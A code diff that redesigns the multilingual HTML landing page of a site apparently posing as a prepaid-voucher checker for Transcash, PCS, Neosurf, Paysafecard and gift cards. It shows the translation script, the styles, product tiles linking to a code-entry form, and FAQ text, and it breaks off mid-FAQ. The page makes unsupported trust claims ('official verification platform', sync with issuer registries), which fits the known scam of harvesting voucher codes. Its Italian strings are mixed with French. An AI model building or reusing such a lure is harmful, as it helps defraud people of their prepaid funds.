@@ -1,239 +1,610 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Authentification-Recharges.com</title>
-  <link rel="stylesheet" href="bootstrap.min.css">
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Authentification & Vérification de Recharges</title>
+  <!-- Bootstrap 5 CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <!-- Bootstrap Icons -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet">
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <!-- Internationalization Script -->
+  <script>
+    const translations = {
+      fr: {
+        brand: '<i class="bi bi-shield-check text-primary"></i> Authentification<span class="text-primary">.</span>',
+        badge: '<i class="bi bi-lock-fill me-1"></i> Système sécurisé & chiffré',
+        hero_title: 'Vérifiez l’authenticité de vos recharges',
+        hero_text: 'Notre plateforme analyse instantanément vos tickets, cartes ou codes d\'achat. Sachez immédiatement si votre code est valide ou s\'il a déjà été utilisé.',
+        hero_link: 'Sélectionner un produit <i class="bi bi-arrow-right ms-2"></i>',
+        section_services: 'Services pris en charge',
+        section_trust: 'Pourquoi nous faire confiance ?',
+        feat1_title: 'Chiffrement de bout en bout',
+        feat1_text: 'Toutes les requêtes d\'analyse de vos codes de recharges transitent via des protocoles SSL hautement sécurisés.',
+        feat2_title: 'Respect de la confidentialité',
+        feat2_text: 'Nous ne stockons aucune valeur monétaire. Notre outil agit comme une simple passerelle de lecture instantanée.',
+        feat3_title: 'Données en temps réel',
+        feat3_text: 'La synchronisation directe avec les registres d\'émetteurs garantit un diagnostic fiable au moment exact de l\'envoi.',
+        section_faq: 'Foire aux questions',
+        faq1_q: 'Qu\'est-ce qu’un ticket de recharge ou un ticket prépayé ?',
+        faq1_r: 'Un ticket prépayé est un moyen de paiement disponible sous forme de code unique. Utilisé pour régler des achats en ligne en toute sécurité, il représente une excellente alternative aux cartes bancaires traditionnelles.',
+        faq2_q: 'Comment fonctionne la vérification d’un ticket ?',
+        faq2_r: 'Il vous suffit d’entrer le code de votre ticket sur le formulaire dédié. Notre système analyse instantanément l’état d’activité du code, et vous recevez une confirmation immédiate sur votre boîte mail.',
+        faq3_q: 'Quels types de tickets puis-je vérifier ici ?',
+        faq3_r: 'Nous prenons en charge les émetteurs leaders comme Transcash, PCS ou Neosurf, ainsi que les codes de divertissement (Google Play, Amazon, Steam, PlayStation). La liste est continuellement mise à jour.',
+        footer_copyright: '&copy; 2026 Authentification-Recharge.com — Tous droits réservés. Connexion chiffrée SSL.'
+      },
+      en: {
+        brand: '<i class="bi bi-shield-check text-primary"></i> Authentication<span class="text-primary">.</span>',
+        badge: '<i class="bi bi-lock-fill me-1"></i> Secure & encrypted system',
+        hero_title: 'Verify the authenticity of your top-ups',
+        hero_text: 'Our platform instantly analyzes your tickets, cards, or purchase codes. Know immediately if your code is valid or if it has already been used.',
+        hero_link: 'Select a product <i class="bi bi-arrow-right ms-2"></i>',
+        section_services: 'Supported Services',
+        section_trust: 'Why trust us?',
+        feat1_title: 'End-to-end encryption',
+        feat1_text: 'All analysis requests for your top-up codes transit via highly secure SSL protocols.',
+        feat2_title: 'Privacy compliance',
+        feat2_text: 'We do not store any monetary value. Our tool acts as a simple instant reading gateway.',
+        feat3_title: 'Real-time data',
+        feat3_text: 'Direct synchronization with issuer registries guarantees a reliable diagnosis at the exact moment of sending.',
+        section_faq: 'Frequently Asked Questions',
+        faq1_q: 'What is a top-up ticket or a prepaid ticket?',
+        faq1_r: 'A prepaid ticket is a payment method available as a unique code. Used to settle online purchases securely, it represents an excellent alternative to traditional credit cards.',
+        faq2_q: 'How does ticket verification work?',
+        faq2_r: 'Simply enter your ticket code into the dedicated form. Our system instantly analyzes the status of the code, and you receive an immediate confirmation in your mailbox.',
+        faq3_q: 'What types of tickets can I verify here?',
+        faq3_r: 'We support leading issuers like Transcash, PCS, or Neosurf, as well as entertainment codes (Google Play, Amazon, Steam, PlayStation). The list is continuously updated.',
+        footer_copyright: '&copy; 2026 Authentication-Topup.com — All rights reserved. SSL Encrypted Connection.'
+      },
+      de: {
+        brand: '<i class="bi bi-shield-check text-primary"></i> Authentifizierung<span class="text-primary">.</span>',
+        badge: '<i class="bi bi-lock-fill me-1"></i> Sicheres & verschlüsseltes System',
+        hero_title: 'Überprüfen Sie die Echtheit Ihres Guthabens',
+        hero_text: 'Unsere Plattform analysiert sofort Ihre Tickets, Karten oder Kaufcodes. Erfahren Sie sofort, ob Ihr Code gültig ist oder ob er bereits verwendet wurde.',
+        hero_link: 'Produkt auswählen <i class="bi bi-arrow-right ms-2"></i>',
+        section_services: 'Unterstützte Dienste',
+        section_trust: 'Warum uns vertrauen?',
+        feat1_title: 'Ende-zu-Ende-Verschlüsselung',
+        feat1_text: 'Alle Analyseanfragen für Ihre Aufladeprodukte werden über hochsichere SSL-Protokolle übertragen.',
+        feat2_title: 'Datenschutz-Konformität',
+        feat2_text: 'Wir speichern keine Geldwerte. Unser Tool fungiert als einfaches Gateway zum sofortigen Auslesen.',
+        feat3_title: 'Echtzeit-Daten',
+        feat3_text: 'Die direkte Synchronisation mit den Registern der Aussteller garantiert eine zuverlässige Diagnose genau zum Zeitpunkt des Versands.',
+        section_faq: 'Häufig gestellte Fragen',
+        faq1_q: 'Was ist ein Aufladeticket oder ein Prepaid-Ticket?',
+        faq1_r: 'Ein Prepaid-Ticket ist ein Zahlungsmittel, das in Form eines einzigartigen Codes verfügbar ist. Es wird verwendet, um Online-Einkäufe sicher zu bezahlen, und stellt eine hervorragende Alternative zu herkömmlichen Bankkarten dar.',
+        faq2_q: 'Wie funktioniert die Überprüfung eines Tickets?',
+        faq2_r: 'Geben Sie einfach Ihren Ticketcode in das dafür vorgesehene Formular ein. Unser System analysiert sofort den Status des Codes, und Sie erhalten eine sofortige Bestätigung in Ihrem Posteingang.',
+        faq3_q: 'Welche Arten von Tickets kann ich hier überprüfen?',
+        faq3_r: 'Wir unterstützen führende Aussteller wie Transcash, PCS oder Neosurf sowie Unterhaltungscodes (Google Play, Amazon, Steam, PlayStation). Die Liste wird laufend aktualisiert.',
+        footer_copyright: '&copy; 2026 Authentifizierung-Aufladen.com — Alle Rechte vorbehalten. SSL-verschlüsselte Verbindung.'
+      },
+      it: {
+        brand: '<i class="bi bi-shield-check text-primary"></i> Autenticazione<span class="text-primary">.</span>',
+        badge: '<i class="bi bi-lock-fill me-1"></i> Sistema sicuro e crittografato',
+        hero_title: 'Verifica l\'autenticità delle tue ricariche',
+        hero_text: 'La nostra piattaforma analizza istantaneamente i tuoi biglietti, carte o codici d\'acquisto. Scopri immédiatement se il tuo codice è valido o se è già stato utilizzato.',
+        hero_link: 'Seleziona un produit <i class="bi bi-arrow-right ms-2"></i>',
+        section_services: 'Servizi supportati',
+        section_trust: 'Perché fidarsi di noi?',
+        feat1_title: 'Crittografia end-to-end',
+        feat1_text: 'Tutte les richieste di analisi per i tuoi codici di ricarica transitano attraverso protocolli SSL altamente sicuri.',
+        feat2_title: 'Rispetto della privacy',
+        feat2_text: 'Non memorizziamo alcun valore monetario. Il nostro strumento funge da semplice gateway di lettura istantanea.',
+        feat3_title: 'Dati in tempo reale',
+        feat3_text: 'La sincronizzazione directe con i registri degli emittenti garantisce una diagnosi affidabile nell\'esatto momento dell\'invio.',
+        section_faq: 'Domande frequenti',
+        faq1_q: 'Cos\'è un biglietto di ricarica o un biglietto prepagato?',
+        faq1_r: 'Un biglietto prepagato è un metodo di pagamento disponible sotto forma di codice univoco. Utilizzato per regolare gli acquisti online in totale sicurezza, rappresenta un\'ottima alternativa alle carte di credito tradizionali.',
+        faq2_q: 'Come funciona la verifica di un biglietto?',
+        faq2_r: 'Ti basta inserire il codice del tuo biglietto nell\'apposito modulo. Il nostro sistema analizza istantaneamente lo stato di attività del codice e riceverai una conferma immediata nella tua casella di posta.',
+        faq3_q: 'Quali tipi di biglietti posso verificare qui?',
+        faq3_r: 'Supportiamo i principali emittenti come Transcash, PCS o Neosurf, nonché i codici di intrattenimento (Google Play, Amazon, Steam, PlayStation). L\'elenco è continuamente aggiornato.',
+        footer_copyright: '&copy; 2026 Autenticazione-Ricarica.com — Tutti i diritti riservati. Connessione crittografata SSL.'
+      }
+    };
+
+    const langConfig = {
+      en: { text: 'English', flag: 'https://flagcdn.com/w20/gb.png' },
+      fr: { text: 'Français', flag: 'https://flagcdn.com/w20/fr.png' },
+      de: { text: 'Deutsch', flag: 'https://flagcdn.com/w20/de.png' },
+      it: { text: 'Italiano', flag: 'https://flagcdn.com/w20/it.png' }
+    };
+
+    function toggleLangMenu() {
+      const menu = document.getElementById('langMenu');
+      menu.style.display = menu.style.display === 'none' ? 'block' : 'none';
+    }
+
+    window.onclick = function(event) {
+      if (!event.target.closest('.custom-language-selector')) {
+        const menu = document.getElementById('langMenu');
+        if (menu) menu.style.display = 'none';
+      }
+    }
+
+    window.setLang = function(lang) {
+      if (!translations[lang]) lang = 'en';
+
+      const selectedLangDiv = document.querySelector('.selected-lang');
+      if (selectedLangDiv && langConfig[lang]) {
+        selectedLangDiv.innerHTML = `
+          <img src="${langConfig[lang].flag}" alt="${lang.toUpperCase()}" class="rounded-1">
+          <span class="ms-2 d-none d-sm-inline">${langConfig[lang].text}</span>
+          <i class="bi bi-chevron-down ms-1 ms-sm-2 fs-7 text-secondary"></i>
+        `;
+      }
+
+      document.querySelectorAll('[data-i18n]').forEach(element => {
+        const key = element.getAttribute('data-i18n');
+        if (translations[lang][key]) {
+          element.innerHTML = translations[lang][key];
+        }
+      });
+
+      const menu = document.getElementById('langMenu');
+      if (menu) menu.style.display = 'none';
+      localStorage.setItem('preferred_lang', lang);
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const savedLang = localStorage.getItem('preferred_lang') || 'fr';
+      window.setLang(savedLang);
+    });
+  </script>
+
   <style>
+    :root {
+      --primary-color: #2563eb;
+      --primary-hover: #1d4ed8;
+      --bg-light: #f8fafc;
+      --text-dark: #0f172a;
+      --text-muted: #64748b;
+      --border-color: #e2e8f0;
+    }
+
     body {
-      font-size: 1.1rem;
-      font-family: 'Poppins', sans-serif;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      background-color: var(--bg-light);
+      color: var(--text-dark);
+      overflow-x: hidden;
     }
-    h1 {
-      font-size: 2.5rem;
+
+    /* Top Bar - Rendu fixe en haut */
+    .top-bar {
+      background-color: #ffffff;
+      border-bottom: 1px solid var(--border-color);
+      padding: 0.5rem 0;
+      z-index: 1060; /* Assure que le sélecteur reste au-dessus de la navbar */
     }
-    h2 {
-      font-size: 2.3rem;
-    }
-    h3 {
-      font-size: 1rem;
-    }
-    a {
-      text-decoration: none !important;
-    }
-    
-    .hero-section {
-      background-color:powderblue;
-      padding-top: 8rem;
-      padding-bottom: 8rem;
-    }
-    .accordion-button {
-      font-size: 1.1rem;
-    }
-    .accordion-body {
-      font-size: 1rem;
+
+    /* Custom Language Selector */
+    .custom-language-selector {
+      position: relative;
+      display: inline-block;
     }
 
     .selected-lang {
-        background-color: darkslategrey;
-        border: 1px solid #ccc;
-        padding: 8px 25px;
-        border-radius: 6px;
-        cursor: pointer;
-        display: flex;
-        align-items: center;
-        gap: 8px;
+      background: transparent;
+      border: none;
+      padding: 0.375rem 0.75rem;
+      font-size: 0.875rem;
+      font-weight: 500;
+      color: var(--text-dark);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      border-radius: 0.375rem;
+      transition: background-color 0.2s;
+    }
+
+    .selected-lang:hover {
+      background-color: #f1f5f9;
+    }
+
+    .lang-dropdown {
+      position: absolute;
+      top: 100%;
+      right: 0;
+      z-index: 1070;
+      display: none;
+      min-width: 160px;
+      padding: 0.5rem 0;
+      margin: 0.125rem 0 0;
+      background-color: #ffffff;
+      border: 1px solid var(--border-color);
+      border-radius: 0.5rem;
+      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+    }
+
+    .lang-item {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      width: 100%;
+      padding: 0.5rem 1rem;
+      font-size: 0.875rem;
+      color: var(--text-dark);
+      text-decoration: none;
+      background: none;
+      border: none;
+      text-align: left;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .lang-item:hover {
+      background-color: #f1f5f9;
+    }
+
+    .lang-item img, .selected-lang img {
+      width: 20px;
+      height: auto;
+      object-fit: cover;
+    }
+
+    /* Navbar - Ajustement de la position pour s'aligner sous la top-bar fixe */
+    .navbar {
+      background-color: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(10px);
+      border-bottom: 1px solid var(--border-color);
+      padding: 1rem 0;
+      top: 41px; /* Hauteur approximative de la top-bar pour éviter le chevauchement */
+    }
+
+    @media (max-width: 575px) {
+      .navbar {
+        top: 37px; /* Ajustement pour mobile */
       }
-    .lang-options {
-  position: absolute;
-        top: 100%;
-        left: 0;
-        width: 100%;
-        margin: 5px 0 0;
-        padding: 0;
-        list-style: none;
-        background-color: darkslategrey;
-        border: 1px solid #ccc;
-        border-radius: 6px;
-        display: none;
-        z-index: 10;
-}
+    }
 
-.lang-options li {
-  padding: 0.5rem 1rem;
-  color: #333333;
-  background-color: transparent;
-  cursor: pointer;
-  transition: background-color 0.3s;
-  display: flex;
-  align-items: center;
-  gap: 8px;
-}
+    .fintech-brand {
+      font-weight: 700;
+      color: var(--text-dark);
+      letter-spacing: -0.02em;
+    }
 
-.lang-options li:hover {
-        background-color: var(--text-color);
-      }
-.lang-options li:hover {
-  background-color: lightslategrey; /* un gris légèrement plus clair */
-}
+    /* Hero Section */
+    .hero-section {
+      padding: 5rem 0 4rem;
+      background: radial-gradient(100% 100% at 50% 0%, rgba(37, 99, 235, 0.05) 0%, rgba(255, 255, 255, 0) 100%);
+    }
 
-.selected-lang {
-  cursor: pointer;
-}
+    .hero-title {
+      font-size: 2.75rem;
+      font-weight: 700;
+      letter-spacing: -0.03em;
+      line-height: 1.2;
+      margin-bottom: 1.5rem;
+    }
 
+    @media (max-width: 768px) {
+      .hero-title { font-size: 2.25rem; }
+    }
+
+    .hero-text {
+      color: var(--text-muted);
+      font-size: 1.125rem;
+      line-height: 1.6;
+      margin-bottom: 2rem;
+    }
+
+    /* Product Grid / Full Image Cards */
+    .section-title {
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      margin-bottom: 3rem;
+      position: relative;
+    }
+
+    .product-card {
+      background: #ffffff;
+      border: 1px solid var(--border-color);
+      border-radius: 1rem;
+      overflow: hidden;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      display: block;
+      position: relative;
+      aspect-ratio: 4 / 3;
+    }
+
+    .product-card:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 12px 24px -8px rgba(0, 0, 0, 0.15);
+      border-color: rgba(37, 99, 235, 0.5);
+    }
+
+    .product-card img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transition: transform 0.3s ease;
+    }
+
+    .product-card:hover img {
+      transform: scale(1.05);
+    }
+
+    /* Trust / Features Section */
+    .features-section {
+      background-color: #ffffff;
+      border-top: 1px solid var(--border-color);
+      border-bottom: 1px solid var(--border-color);
+    }
+
+    .feature-item {
+      padding: 1.5rem;
+    }
+
+    .feature-icon {
+      color: var(--primary-color);
+      font-size: 1.5rem;
+      margin-bottom: 1rem;
+    }
+
+    /* Accordion / FAQ */
+    .accordion-item {
+      border: 1px solid var(--border-color);
+      border-radius: 0.75rem !important;
+      margin-bottom: 1rem;
+      overflow: hidden;
+      background-color: #ffffff;
+    }
+
+    .accordion-button {
+      font-weight: 600;
+      color: var(--text-dark);
+      padding: 1.25rem;
+    }
+
+    .accordion-button:not(.collapsed) {
+      background-color: rgba(37, 99, 235, 0.02);
+      color: var(--primary-color);
+      box-shadow: none;
+    }
+
+    .accordion-button:focus {
+      box-shadow: none;
+      border-color: var(--border-color);
+    }
+
+    /* Footer */
+    footer {
+      background-color: #ffffff;
+      border-top: 1px solid var(--border-color);
+      padding: 2rem 0;
+      color: var(--text-muted);
+      font-size: 0.9rem;
+    }
   </style>
 </head>
 <body>
-  <header class="bg-dark text-white py-4">
+
+  <!-- Top Bar with Language Selector (Fixée en haut) -->
+  <div class="top-bar sticky-top">
     <div class="container d-flex justify-content-between align-items-center">
-      <nav>
-        <a class="text-white me-3" href="#">Accueil</a>
-      </nav>
-      <div class="custom-language-selector position-relative">
-        <div class="selected-lang d-flex align-items-center cursor-pointer" onclick="toggleLangMenu()">
-          <img src="https://flagcdn.com/w20/gb.png" alt="EN">
-          <span class="ms-2">English</span>
-        </div>
-        <ul class="lang-options list-unstyled position-absolute border shadow " style="display: none;">
-          <li class="cursor-pointer" onclick="setLang('en')">
-            <img src="https://flagcdn.com/w20/gb.png" alt="EN"> English
-          </li>
-          <li class="cursor-pointer" onclick="setLang('fr')">
-            <img src="https://flagcdn.com/w20/fr.png" alt="FR"> Français
-          </li>
-          <li class="cursor-pointer" onclick="setLang('es')">
-            <img src="https://flagcdn.com/w20/es.png" alt="ES"> Español
-          </li>
-          <li class="cursor-pointer" onclick="setLang('de')">
-            <img src="https://flagcdn.com/w20/de.png" alt="DE"> Deutsch
-          </li>
-          <li class="cursor-pointer" onclick="setLang('it')">
-            <img src="https://flagcdn.com/w20/it.png" alt="IT"> Italiano
-          </li>
-          <li class="cursor-pointer" onclick="setLang('pt')">
-            <img src="https://flagcdn.com/w20/pt.png" alt="PT"> Português
-          </li>
-        </ul>
+      <div class="small text-muted d-none d-md-block">
+        <i class="bi bi-patch-check-fill text-success me-1"></i> Plateforme de vérification officielle
       </div>
-    </div>
-  </header>
-
-  <main class="page-wrapper">
-    <section class="hero-section text-center">
-      <div class="container">
-        <h1 data-i18n="hero_title">Bienvenue sur Authentification-Recharges.com</h1>
-        <p data-i18n="hero_text">Vérifiez rapidement l’authenticité de vos tickets, cartes ou codes d’achat. Notre système vous informe instantanément si le code a déjà été utilisé ou non.</p>
-        <a href="#galerie" class="btn btn-primary mt-3" data-i18n="hero_link">Découvrir nos offres</a>
-      </div>
-    </section>
-
-    
-
-    <section id="galerie" class="gallery py-5">
-      <div class="container">
-        <h2 class="text-center mb-4"></h2>
-        <div class="row g-3">
-          <div class="col-6 col-md-3">
-            <a href="form.html"><img class="img-fluid rounded shadow" src="img/transcash.png" alt="Transcash"></a>
-          </div>
-          <div class="col-6 col-md-3">
-            <a href="form.html"><img class="img-fluid rounded shadow" src="img/pcs.png" alt="PCS"></a>
-          </div>
-          <div class="col-6 col-md-3">
-            <a href="form.html"><img class="img-fluid rounded shadow" src="img/neosurf.jpg" alt="Neosurf"></a>
-          </div>
-          <div class="col-6 col-md-3">
-            <a href="form.html"><img class="img-fluid rounded shadow" src="img/steam.jpg" alt="Steam"></a>
-          </div>
-          <div class="col-6 col-md-3">
-            <a href="form.html"><img class="img-fluid rounded shadow" src="img/google_play.jpg" alt="Google Play"></a>
-          </div>
-          <div class="col-6 col-md-3">
-            <a href="form.html"><img class="img-fluid rounded shadow" src="img/PaySafeCard.jpg" alt="Paysafe Card"></a>
-          </div>
-          <div class="col-6 col-md-3">
-            <a href="form.html"><img class="img-fluid rounded shadow" src="img/Amazon.jpg" alt="Amazon"></a>
-          </div>
-          <div class="col-6 col-md-3">
-            <a href="form.html"><img class="img-fluid rounded shadow" src="img/Playstation_store.jpg" alt="Playstation store"></a>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <section id="faq" class="faq py-5 bg-light">
-  <div class="container">
-    <h2 class="text-center mb-4">FAQ</h2>
-    <div class="accordion" id="faqAccordion">
-      <div class="accordion-item">
-        <h2 class="accordion-header">
-          <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq1">
-            <span data-i18n="faq1">Qu'est-ce qu’un ticket de recharge ou un ticket prépayé ?</span>
+      <div class="ms-auto">
+        <div class="custom-language-selector">
+          <button class="selected-lang" onclick="toggleLangMenu()">
+            <img src="https://flagcdn.com/w20/fr.png" alt="FR" class="rounded-1">
+            <span class="ms-2 d-none d-sm-inline">Français</span>
+            <i class="bi bi-chevron-down ms-1 ms-sm-2 fs-7 text-secondary"></i>
           </button>
-        </h2>
-        <div id="faq1" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
-          <div class="accordion-body fs-5" data-i18n="faq1r">
-            Un ticket prépayé est un moyen de paiement disponible sous forme de code. Il est souvent utilisé pour acheter des biens ou des services en ligne. Ces tickets offrent une alternative sécurisée aux cartes bancaires traditionnelles.
-          </div>
-        </div>
-      </div>
-
-      <div class="accordion-item">
-        <h2 class="accordion-header">
-          <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq2">
-            <span data-i18n="faq2">Comment fonctionne la vérification d’un ticket ?</span>
-          </button>
-        </h2>
-        <div id="faq2" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
-          <div class="accordion-body fs-5" data-i18n="faq2r">
-            Il vous suffit d’entrer le code de votre ticket sur notre plateforme. Le système analyse alors si ce code a déjà été utilisé ou non. Vous recevez immédiatement un message de confirmation dans votre boîte mail.
-          </div>
-        </div>
-      </div>
-
-      <div class="accordion-item">
-        <h2 class="accordion-header">
-          <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq3">
-            <span data-i18n="faq3">Quels types de tickets puis-je vérifier ici ?</span>
-          </button>
-        </h2>
-        <div id="faq3" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
-          <div class="accordion-body fs-5" data-i18n="faq3r">
-            Notre plateforme prend en charge les tickets de recharge comme Transcash, PCS, Neosurf, et bien d'autres. Vous pouvez aussi vérifier les codes pour Google Play, Amazon, Steam, ou PlayStation. La liste est mise à jour régulièrement pour inclure de nouveaux formats.
-          </div>
-        </div>
-      </div>
-
-      <div class="accordion-item">
-        <h2 class="accordion-header">
-          <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq4">
-            <span data-i18n="faq4">Comment recevoir un email de confirmation ?</span>
-          </button>
-        </h2>
-        <div id="faq4" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
-          <div class="accordion-body fs-5" data-i18n="faq4r">
-            Entrez simplement une adresse e-mail valide dans le formulaire de vérification. Une fois le code soumis, un email vous est automatiquement envoyé. Ce message confirme l’état d’utilisation du ticket.
+          <div class="lang-dropdown" id="langMenu">
+            <button class="lang-item" onclick="window.setLang('fr')">
+              <img src="https://flagcdn.com/w20/fr.png" alt="FR"> Français
+            </button>
+            <button class="lang-item" onclick="window.setLang('en')">
+              <img src="https://flagcdn.com/w20/gb.png" alt="EN"> English
+            </button>
+            <button class="lang-item" onclick="window.setLang('de')">
+              <img src="https://flagcdn.com/w20/de.png" alt="DE"> Deutsch
+            </button>
+            <button class="lang-item" onclick="window.setLang('it')">
+              <img src="https://flagcdn.com/w20/it.png" alt="IT"> Italiano
+            </button>
           </div>
         </div>
       </div>
     </div>
   </div>
-</section>
 
-  </main>
+  <!-- Navigation (Fixée également sous la top-bar) -->
+  <nav class="navbar navbar-expand-lg sticky-top">
+    <div class="container justify-content-center">
+      <a class="text-decoration-none d-flex align-items-center gap-2 fs-5 fintech-brand" href="#" data-i18n="brand">
+        <i class="bi bi-shield-check text-primary"></i> Authentification<span class="text-primary">.</span>
+      </a>
+    </div>
+  </nav>
 
-  <footer class="bg-dark text-white py-4 mt-5">
-    <div class="container text-center">
-      <div class="mb-2">
-        
+  <!-- Hero Section -->
+  <section class="hero-section">
+    <div class="container">
+      <div class="row align-items-center justify-content-center text-center">
+        <div class="col-lg-8 col-xl-7">
+          <div class="badge bg-primary bg-opacity-10 text-primary px-3 py-2 rounded-pill mb-3 fw-semibold small" data-i18n="badge">
+            <i class="bi bi-lock-fill me-1"></i> Système sécurisé & chiffré
+          </div>
+          <h1 class="hero-title text-balance" data-i18n="hero_title">
+            Vérifiez l’authenticité de vos recharges
+          </h1>
+          <p class="hero-text px-md-4" data-i18n="hero_text">
+            Notre plateforme analyse instantanément vos tickets, cartes ou codes d'achat. Sachez immédiatement si votre code est valide ou s'il a déjà été utilisé.
+          </p>
+          <div class="d-flex flex-column flex-sm-row gap-3 justify-content-center align-items-center">
+            <a href="#services" class="btn btn-primary btn-lg px-4 py-3 rounded-3 shadow-sm fw-medium fs-6" data-i18n="hero_link">
+              Sélectionner un produit <i class="bi bi-arrow-right ms-2"></i>
+            </a>
+          </div>
+        </div>
       </div>
-      <h3 class="mb-0" data-i18n="footer_copyright">&copy; 2025 Authentification-Recharges.com Tous droits réservés.</h3>
+    </div>
+  </section>
+
+  <!-- Services Section (col-12 sur mobile pour afficher une seule image par ligne) -->
+  <section id="services" class="py-5">
+    <div class="container py-4">
+      <h2 class="text-center section-title" data-i18n="section_services">Services pris en charge</h2>
+      <div class="row g-4 justify-content-center">
+        <!-- 1. Transcash -->
+        <div class="col-12 col-md-4 col-lg-3">
+          <a href="form.html" class="product-card">
+            <img src="img/transcash.png" alt="Transcash">
+          </a>
+        </div>
+        <!-- 2. PCS -->
+        <div class="col-12 col-md-4 col-lg-3">
+          <a href="form.html" class="product-card">
+            <img src="img/pcs.png" alt="PCS">
+          </a>
+        </div>
+        <!-- 3. Neosurf -->
+        <div class="col-12 col-md-4 col-lg-3">
+          <a href="form.html" class="product-card">
+            <img src="img/neosurf.jpg" alt="Neosurf">
+          </a>
+        </div>
+        <!-- 4. Steam -->
+        <div class="col-12 col-md-4 col-lg-3">
+          <a href="form.html" class="product-card">
+            <img src="img/steam.jpg" alt="Steam">
+          </a>
+        </div>
+        <!-- 5. Google Play -->
+        <div class="col-12 col-md-4 col-lg-3">
+          <a href="form.html" class="product-card">
+            <img src="img/google_play.jpg" alt="Google Play">
+          </a>
+        </div>
+        <!-- 6. Paysafecard -->
+        <div class="col-12 col-md-4 col-lg-3">
+          <a href="form.html" class="product-card">
+            <img src="img/PaySafeCard.jpg" alt="Paysafe Card">
+          </a>
+        </div>
+        <!-- 7. Amazon -->
+        <div class="col-12 col-md-4 col-lg-3">
+          <a href="form.html" class="product-card">
+            <img src="img/Amazon.jpg" alt="Amazon">
+          </a>
+        </div>
+        <!-- 8. Playstation Store -->
+        <div class="col-12 col-md-4 col-lg-3">
+          <a href="form.html" class="product-card">
+            <img src="img/Playstation_store.jpg" alt="Playstation store">
+          </a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Trust Features Section -->
+  <section class="features-section py-5">
+    <div class="container py-4">
+      <h2 class="text-center section-title" data-i18n="section_trust">Pourquoi nous faire confiance ?</h2>
+      <div class="row g-4 text-center text-md-start">
+        <div class="col-md-4">
+          <div class="feature-item">
+            <div class="feature-icon"><i class="bi bi-shield-lock-fill"></i></div>
+            <h3 class="h5 mb-2" data-i18n="feat1_title">Chiffrement de bout en bout</h3>
+            <p class="small text-muted mb-0" data-i18n="feat1_text">
+              Toutes les requêtes d'analyse de vos codes de recharges transitent via des protocoles SSL hautement sécurisés.
+            </p>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="feature-item">
+            <div class="feature-icon"><i class="bi bi-eye-slash-fill"></i></div>
+            <h3 class="h5 mb-2" data-i18n="feat2_title">Respect de la confidentialité</h3>
+            <p class="small text-muted mb-0" data-i18n="feat2_text">
+              Nous ne stockons aucune valeur monétaire. Notre outil agit comme une simple passerelle de lecture instantanée.
+            </p>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="feature-item">
+            <div class="feature-icon"><i class="bi bi-lightning-charge-fill"></i></div>
+            <h3 class="h5 mb-2" data-i18n="feat3_title">Données en temps réel</h3>
+            <p class="small text-muted mb-0" data-i18n="feat3_text">
+              La synchronisation directe avec les registres d'émetteurs garantit un diagnostic fiable au moment exact de l'envoi.
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- FAQ Section -->
+  <section class="py-5 bg-white border-bottom">
+    <div class="container py-4">
+      <h2 class="text-center section-title" data-i18n="section_faq">Foire aux questions</h2>
+      <div class="row justify-content-center">
+        <div class="col-lg-8">
+          <div class="accordion" id="faqAccordion">
+            <!-- FAQ 1 -->
+            <div class="accordion-item">
+              <h2 class="accordion-header">
+                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq1" data-i18n="faq1_q">
+                  Qu'est-ce qu’un ticket de recharge ou un ticket prépayé ?
+                </button>
+              </h2>
+              <div id="faq1" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                <div class="accordion-body text-muted small" data-i18n="faq1_r">
+                  Un ticket prépayé est un moyen de paiement disponible sous forme de code unique. Utilisé pour régler des achats en ligne en toute sécurité, il représente une excellente alternative aux cartes bancaires traditionnelles.
+                </div>
+              </div>
+            </div>
+            <!-- FAQ 2 -->
+            <div class="accordion-item">
+              <h2 class="accordion-header">
+                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq2" data-i18n="faq2_q">
+                  Comment fonctionne la vérification d’un ticket ?
+                </button>
+              </h2>
+              <div id="faq2" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                <div class="accordion-body text-muted small" data-i18n="faq2_r">
